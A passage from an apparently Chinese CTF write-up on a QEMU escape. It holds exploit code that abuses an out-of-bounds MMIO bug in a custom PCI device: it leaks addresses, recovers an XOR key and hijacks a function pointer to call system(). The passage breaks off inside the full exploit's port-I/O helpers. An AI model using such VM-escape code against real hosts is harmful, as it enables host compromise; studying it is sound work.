class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">denc_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = denc_realize;</span><br><span class="line"></span><br><span class="line">    k-&gt;vendor_id = <span class="number">0x1234</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11E9</span>;</span><br><span class="line">    k-&gt;revision  = <span class="number">0x01</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS;   <span class="comment">// 0xFF</span></span><br><span class="line"></span><br><span class="line">    device_categorizable_set_bit(dc, DEVICE_CATEGORY_MISC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>denc_mmio_read</code> 和 <code>denc_mmio_write</code> 存在越界读写，虽然写入写的值会异或 <code>key</code>，但是读取的值没有被异或，因此我们首先可以直接通过越界读泄露地址：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> qemu_base = (mmio_read32(<span class="number">0x20</span>) | (<span class="type">uint64_t</span>)mmio_read32(<span class="number">0x24</span>) &lt;&lt; <span class="number">32</span>) - <span class="number">0x3a9ea8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] qemu_base: %#llx\n&quot;</span>, qemu_base);</span><br><span class="line"><span class="type">size_t</span> system_plt = qemu_base + <span class="number">0x2ccb60</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt addr: %#llx\n&quot;</span>, system_plt);</span><br></pre></td></tr></table></figure></div>

<p>同时我们可以通过将写入的值与读取的值异或得到对应位置的 <code>key</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(i * <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    key[i] = mmio_read32(i * <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">qword_dump(<span class="string">&quot;leak key&quot;</span>, key, <span class="keyword">sizeof</span>(key));</span><br></pre></td></tr></table></figure></div>

<p>之后越界修改函数指针并调用：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(cmd); i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(i, (*(<span class="type">uint32_t</span>*)&amp;cmd[i]) ^ key[i / <span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_write32(<span class="number">8</span> * <span class="number">4</span>, (system_plt &amp; <span class="number">0xFFFFFFFF</span>) ^ key[<span class="number">8</span>]);</span><br><span class="line">mmio_write32(<span class="number">9</span> * <span class="number">4</span>, (system_plt &gt;&gt; <span class="number">32</span>) ^ key[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">pio_write32(<span class="number">0x660</span>, <span class="number">0x114514</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="完整-Exp-2"><a href="#完整-Exp-2" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_IO 0x00000100ULL  <span class="comment">// 与内核 ioport 标志一致</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> base; <span class="comment">// 端口基址 (x86 的 I/O 空间是 16-bit)</span></span><br><span class="line">    <span class="type">uint32_t</span> size; <span class="comment">// BAR 大小（字节）</span></span><br><span class="line">    <span class="type">uint16_t</span> grant_base; <span class="comment">// 实际通过 ioperm 开放的起始端口</span></span><br><span class="line">    <span class="type">uint32_t</span> grant_len; <span class="comment">// 实际开放长度</span></span><br><span class="line">    <span class="type">bool</span> have_ioperm;</span><br><span class="line">    <span class="type">bool</span> have_iopl;</span><br><span class="line">    <span class="type">bool</span> inited;</span><br><span class="line">&#125; <span class="type">pio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pio_ctx_t</span> g_pio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：从 /sys/bus/pci/devices/&lt;BDF&gt;/resource 解析出指定 BAR（或自动挑首个 PIO BAR）的 start/end/flags */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_io_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                        <span class="type">uint16_t</span>* out_base, <span class="type">uint32_t</span>* out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可直接传 resource 文件全路径</span></span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE* fp = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, chosen = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;start, &amp;end, &amp;flags) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(flags &amp; IORESOURCE_IO))</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (flags &amp; IORESOURCE_IO))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (chosen &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：获取端口访问权限。优先 ioperm(仅开本 BAR 范围)，失败回退 iopl(3) */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">acquire_io_priv</span><span class="params">(<span class="type">uint16_t</span> base, <span class="type">uint32_t</span> size,</span></span><br><span class="line"><span class="params">                           <span class="type">uint16_t</span>* grant_base, <span class="type">uint32_t</span>* grant_len,</span></span><br><span class="line"><span class="params">                           <span class="type">bool</span>* have_ioperm, <span class="type">bool</span>* have_iopl)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span>)base + len &gt; <span class="number">0x10000</span>u) len = <span class="number">0x10000</span>u - base; <span class="comment">// 不越过 64K 上限</span></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) len = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(base, len, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *grant_base = base;</span><br><span class="line">        *grant_len = len;</span><br><span class="line">        *have_ioperm = <span class="literal">true</span>;</span><br><span class="line">        *have_iopl = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *grant_base = <span class="number">0</span>;</span><br><span class="line">        *grant_len = <span class="number">0</span>;</span><br><span class="line">        *have_ioperm = <span class="literal">false</span>;</span><br><span class="line">        *have_iopl = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ====== 对外 API ====== */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pio_init</span></span><br><span class="line"><span class="comment"> *   bdf_or_path : &quot;0000:bb:dd.f&quot; 形式的 BDF；或直接传 resource 的绝对路径</span></span><br><span class="line"><span class="comment"> *   bar_idx     : 0..5 指定 BAR；传 -1 自动挑选第一个 PIO BAR</span></span><br><span class="line"><span class="comment"> * 返回 0 成功，-1 失败（查看 errno）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> base = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_io_bar(bdf_or_path, bar_idx, &amp;base, &amp;size) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> gbase = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> glen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> have_perm = <span class="literal">false</span>, have_iopl = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (acquire_io_priv(base, size, &amp;gbase, &amp;glen, &amp;have_perm, &amp;have_iopl) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g_pio.base = base;</span><br><span class="line">    g_pio.size = size;</span><br><span class="line">    g_pio.grant_base = gbase;</span><br><span class="line">    g_pio.grant_len = glen;</span><br><span class="line">    g_pio.have_ioperm = have_perm;</span><br><span class="line">    g_pio.have_iopl = have_iopl;</span><br><span class="line">    g_pio.inited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 收尾：撤销 ioperm；iopl 切回 0（可忽略失败，进程退出也会复原） */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_ioperm) (<span class="type">void</span>)ioperm(g_pio.grant_base, g_pio.grant_len, <span class="number">0</span>);</span><br><span 